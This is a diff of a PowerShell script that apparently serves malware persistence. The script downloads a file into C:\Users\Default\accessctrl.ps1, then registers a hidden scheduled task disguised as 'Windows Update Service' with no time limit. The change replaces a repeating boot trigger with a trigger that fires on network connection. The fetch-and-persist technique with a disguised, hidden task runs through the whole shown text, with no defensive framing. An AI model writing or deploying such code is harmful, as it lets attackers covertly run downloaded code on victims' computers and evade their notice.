@@ -15,21 +15,17 @@ $outputPath = "C:\Users\Default\accessctrl.ps1"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-10-13T00:56:52.6271595</Date>
     <Author>System\User</Author>
     <URI>\Windows Update Service</URI>
   </RegistrationInfo>
   <Triggers>
-    <BootTrigger>
-      <Repetition>
-        <Interval>PT10M</Interval>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
+    <EventTrigger>
       <Enabled>true</Enabled>
-      <Delay>PT15M</Delay>
-    </BootTrigger>
+      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+    </EventTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -52,6 +48,8 @@ $xmlContent = @"
     <Enabled>true</Enabled>
     <Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
     <WakeToRun>false</WakeToRun>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
     <Priority>7</Priority>
